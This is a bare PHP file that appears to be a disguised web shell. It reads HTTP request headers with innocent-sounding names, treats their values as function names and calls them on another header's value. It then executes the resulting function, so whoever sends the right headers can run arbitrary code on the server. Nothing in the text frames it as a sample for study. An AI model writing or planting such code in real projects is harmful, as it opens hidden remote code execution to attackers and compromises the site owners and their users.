<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $partition = $_HEADERS['Feature-Policy']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['X-Dns-Prefetch-Control']));
    $partition();
}